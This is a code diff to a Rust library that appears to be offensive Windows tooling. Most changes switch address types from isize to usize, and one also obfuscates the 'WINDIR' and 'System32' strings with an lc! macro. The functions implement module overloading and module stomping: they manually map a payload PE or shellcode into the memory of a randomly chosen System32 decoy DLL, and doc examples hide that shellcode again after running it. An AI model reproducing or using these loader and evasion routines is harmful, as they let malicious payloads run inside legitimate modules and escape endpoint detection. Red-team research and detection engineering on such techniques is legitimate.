@@ -8,20 +8,20 @@ use windows::Win32::{Foundation::HANDLE, System::SystemServices::IMAGE_BASE_RELO
 use data::{PeMetadata, PVOID, PAGE_READWRITE, PeManualMap, PAGE_EXECUTE_READ};
 use winproc::Process;
 
-fn find_suitable_module(function_size: u32) -> isize
+fn find_suitable_module(function_size: u32) -> usize
 {
     let process = Process::current();
     let modules = process.module_list().unwrap();
-    let mut suitable_text_sections: Vec<isize> = vec![];
+    let mut suitable_text_sections: Vec<usize> = vec![];
     for m in modules
     {
-        let module_base_address = m.handle() as isize;
+        let module_base_address = m.handle() as usize;
         let offset = is_suitable(function_size, module_base_address);
         if offset != 0 && !m.name().unwrap().contains(".exe") {
-            return module_base_address + offset as isize;
+            return module_base_address + offset as usize;
         }
         
-        let module_metadata = manualmap::get_pe_metadata(module_base_address as *const u8);
+        let module_metadata = manualmap::get_pe_metadata(module_base_address as *const u8, false);
         if module_metadata.is_ok()
         {
             let pe_metadata = module_metadata.unwrap();
@@ -48,7 +48,7 @@ fn find_suitable_module(function_size: u32) -> isize
     0
 }
 
-fn is_suitable(function_size: u32, module_base_address: isize) -> u32
+fn is_suitable(function_size: u32, module_base_address: usize) -> u32
 {
     unsafe
     {
@@ -119,8 +119,10 @@ pub fn find_decoy_module (min_size: i64) -> String
     let mut rng = WyRand::new();
     while files.len() > 0
     {
+        let windir = &lc!("WINDIR");
+        let sys32 = &lc!("System32");
         let r = rng.generate_range(0..files.len());
-        let path =  format!("{}\\{}\\{}",env::var("WINDIR").unwrap(), "System32", &files[r]);
+        let path =  format!("{}\\{}\\{}", windir, sys32, &files[r]);
         let size = fs::metadata(&path).unwrap().len() as i64;
         if size > (min_size * 2) {
             return path;
@@ -150,7 +152,7 @@ pub fn find_decoy_module (min_size: i64) -> String
 ///     Err(e) => println!("An error has occurred: {}", e),      
 /// }
 /// ```
-pub fn read_and_overload(payload_path: &str, decoy_module_path: &str) -> Result<(PeMetadata,isize), String>
+pub fn read_and_overload(payload_path: &str, decoy_module_path: &str) -> Result<(PeMetadata,usize), String>
 {
 
     if !Path::new(payload_path).is_file() {
@@ -192,7 +194,7 @@ pub fn read_and_overload(payload_path: &str, decoy_module_path: &str) -> Result<
 ///     Err(e) => println!("An error has occurred: {}", e),      
 /// }
 /// ```
-pub fn overload_module (file_content: &Vec<u8>, decoy_module_path: &str) -> Result<(PeMetadata,isize), String> 
+pub fn overload_module (file_content: &Vec<u8>, decoy_module_path: &str) -> Result<(PeMetadata,usize), String> 
 {   
     let mut decoy_module_path = decoy_module_path.to_string();
     if decoy_module_path != ""
@@ -217,7 +219,7 @@ pub fn overload_module (file_content: &Vec<u8>, decoy_module_path: &str) -> Resu
 
         let decoy_metadata: (PeManualMap, HANDLE) = manualmap::map_to_section(&decoy_module_path)?;
 
-        let result: (PeMetadata,isize) = overload_to_section(file_content, decoy_metadata.0)?;
+        let result: (PeMetadata,usize) = overload_to_section(file_content, decoy_metadata.0)?;
 
         Ok(result)
 }
@@ -241,7 +243,7 @@ pub fn overload_module (file_content: &Vec<u8>, decoy_module_path: &str) -> Resu
 ///     Err(e) => println!("An error has occurred: {}", e),      
 /// }
 /// ```
-pub fn overload_to_section (file_content: &Vec<u8>, section_metadata: PeManualMap) -> Result<(PeMetadata,isize), String>
+pub fn overload_to_section (file_content: &Vec<u8>, section_metadata: PeManualMap) -> Result<(PeMetadata,usize), String>
 {
     unsafe
     {
@@ -271,14 +273,14 @@ pub fn overload_to_section (file_content: &Vec<u8>, section_metadata: PeManualMa
         dinvoke::rtl_zero_memory(*base_address, region_size);
         
         let module_ptr: *const u8 = std::mem::transmute(file_content.as_ptr());
-        let pe_info = manualmap::get_pe_metadata(module_ptr)?;
+        let pe_info = manualmap::get_pe_metadata(module_ptr, false)?;
         
         manualmap::map_module_to_memory(module_ptr, *base_address, &pe_info)?;
         manualmap::relocate_module(&pe_info, *base_address);
         manualmap::rewrite_module_iat(&pe_info, *base_address)?;
         manualmap::set_module_section_permissions(&pe_info, *base_address)?;
 
-        Ok((pe_info, *base_address as isize))
+        Ok((pe_info, *base_address as usize))
     }
 }
 
@@ -299,7 +301,7 @@ pub fn overload_to_section (file_content: &Vec<u8>, section_metadata: PeManualMa
 ///     Err(e) => println!("An error has occurred: {}", e),      
 /// }
 /// ```
-pub fn managed_read_and_overload (payload_path: &str, decoy_module_path: &str) -> Result<((Vec<u8>,Vec<u8>),isize), String>
+pub fn managed_read_and_overload (payload_path: &str, decoy_module_path: &str) -> Result<((Vec<u8>,Vec<u8>),usize), String>
 {
 
     if !Path::new(payload_path).is_file() {
@@ -332,7 +334,7 @@ pub fn managed_read_and_overload (payload_path: &str, decoy_module_path: &str) -
 ///     Err(e) => println!("An error has occurred: {}", e),      
 /// }
 /// ```
-pub fn managed_overload_module (file_content: Vec<u8>, decoy_module_path: &str) -> Result<(Vec<u8>,isize), String> 
+pub fn managed_overload_module (file_content: Vec<u8>, decoy_module_path: &str) -> Result<(Vec<u8>,usize), String> 
 {   
     let mut decoy_module_path = decoy_module_path.to_string();
     let decoy_content;
@@ -359,7 +361,7 @@ pub fn managed_overload_module (file_content: Vec<u8>, decoy_module_path: &str) 
 
         let decoy_metadata: (PeManualMap, HANDLE) = manualmap::map_to_section(&decoy_module_path)?;
 
-        let result: (PeMetadata,isize) = overload_to_section(&file_content, decoy_metadata.0)?;
+        let result: (PeMetadata,usize) = overload_to_section(&file_content, decoy_metadata.0)?;
 
         Ok((decoy_content, result.1))
 }
@@ -432,7 +434,7 @@ pub fn managed_overload_module (file_content: Vec<u8>, decoy_module_path: &str) 
 /// run();
 /// let _r = manager.hide_shellcode(overload.1).unwrap(); // We hide the shellcode again
 /// ```
-pub fn managed_module_stomping(payload_content: &Vec<u8>, mut stomp_address: isize, module_base_address: isize) -> Result<(Vec<u8>,isize), String>
+pub fn managed_module_stomping(payload_content: &Vec<u8>, mut stomp_address: usize, module_base_address: usize) -> Result<(Vec<u8>,usize), String>
 {
     unsafe
     {
@@ -449,7 +451,7 @@ pub fn managed_module_stomping(payload_content: &Vec<u8>, mut stomp_address: isi
             {
                 let offset = is_suitable(size, module_base_address);
                 if offset != 0 {
-                    stomp_address = module_base_address + offset as isize;
+                    stomp_address = module_base_address + offset as usize;
                 }
                 else {
                     return Err(lc!("[x] The selected module is not valid to stomp the payload."));
@@ -465,7 +467,7 @@ pub fn managed_module_stomping(payload_content: &Vec<u8>, mut stomp_address: isi
         }
         
         let stomp_address_clone = stomp_address;
-        let real_content = vec![0u8;size as usize];
+        let real_content = vec![0u8; size as usize];
         let buffer = std::mem::transmute(real_content.as_ptr());
         let written = usize::default();
         let bytes_written: *mut usize = std::mem::transmute(&written);
@@ -558,7 +560,7 @@ pub fn generate_template(input_file: &str, output_directory: &str) -> Result<(),
             return Err(lc!("[x] Invalid input dll."));
         }
 
-        let mapped_dll_metadata = manualmap::get_pe_metadata(mapped_dll as _).unwrap();
+        let mapped_dll_metadata = manualmap::get_pe_metadata(mapped_dll as _, false).unwrap();
         let entry_point;
         if mapped_dll_metadata.is_32_bit 
         {
@@ -607,7 +609,7 @@ pub fn generate_template(input_file: &str, output_directory: &str) -> Result<(),
         let dll_content = fs::read(input_file).expect(&lc!("[x] Error opening the specified dll."));
         
         let dll_content_buffer = dll_content.as_ptr() as _;
-        let pe_info = manualmap::get_pe_metadata(dll_content_buffer).unwrap();
+        let pe_info = manualmap::get_pe_metadata(dll_content_buffer, false).unwrap();
   
         for section in &pe_info.sections
         {
@@ -702,7 +704,7 @@ pub fn template_stomping(template_path: &str, payload_content: &mut Vec<u8>) -> 
             return Err(lc!("[x] Error calling LoadLibraryA."));
         }
 
-        let dll_metadata = manualmap::get_pe_metadata(loaded_dll as _).unwrap();
+        let dll_metadata = manualmap::get_pe_metadata(loaded_dll as _, false).unwrap();
         for section in &dll_metadata.sections
         {
             if std::str::from_utf8(&section.Name).unwrap().contains(text_name)
